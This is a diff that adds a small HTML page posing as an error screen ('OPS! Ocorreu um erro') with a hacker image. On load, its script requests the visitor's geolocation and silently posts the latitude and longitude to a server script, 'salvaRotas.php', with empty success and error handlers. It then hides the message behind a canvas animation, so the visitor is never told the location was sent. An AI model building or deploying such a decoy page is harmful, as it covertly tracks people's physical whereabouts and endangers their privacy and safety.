@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+  
+  <div class="content">
+    <img src="hacker.svg" alt="">
+    <p>OPS! Ocorreu um erro</p>
+  </div>
+
+  <canvas id="c"></canvas>
+
+
+  <script src="https://code.jquery.com/jquery-3.4.1.min.js"
+    integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+  <script src="canvas.js"></script>
+  <script>
+    //https://www.mapsdirections.info/pt/coordenadas-gps.html
+    $(function () {
+      setTimeout(function () {
+        $('.content').hide();
+        $('#c').css('display', 'block');
+
+      }, 3000);
+      var x = document.getElementById("demo");
+
+      getLocation();
+
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(showPosition);
+        } else {
+          x.innerHTML = "Geolocation is not supported by this browser.";
+        }
+      }
+
+      function showPosition(position) {
+          $.ajax({
+          url: 'salvaRotas.php',
+          type: 'POST',
+          data: {
+            lat: position.coords.latitude,
+            log: position.coords.longitude
+          },
+          success: function (data) {
+           // 
+          },
+          error: function () {
+            //
+          }
+        });
+
+        console.log("Latitude: " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude);
+      }
+    });
+  </script>
+
+</body>
+
+</html>
